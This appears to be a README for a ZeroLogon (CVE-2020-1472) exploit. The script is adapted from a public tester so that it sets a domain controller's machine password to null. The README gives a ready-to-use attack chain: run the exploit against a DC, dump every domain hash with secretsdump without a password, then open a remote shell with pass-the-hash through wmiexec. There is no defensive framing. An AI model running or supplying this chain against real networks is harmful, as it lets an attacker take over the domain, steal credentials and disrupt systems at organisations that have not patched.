# ZeroLogon - Exploit and Example
Modified the test PoC from [Secura](https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py), CVE-2020-1472, in order to change the machine's password to null.
Changing the password on the machine uses [Microsoft's NetrServerPasswordSet2()](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81) function.  This exploit takes advantage of [Impacket's nrpc.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py) module to call NetrServerPasswordSet2(). 

## Run the exploit
`./zerologon_NULLPASS.py <dc-name> <dc-ip>`
![](https://i.imgur.com/R4Jui6O.png)

## Dump the hashes
`secretsdump.py -no-pass <dc-name>\$@<dc-ip>`
![](https://i.imgur.com/7GaZ9NY.png)

## Pass-The-Hash for shell access
`wmiexec.py -hashes <LM:NT> <username>@<ip>`
![](https://i.imgur.com/NCFVJ1o.png)
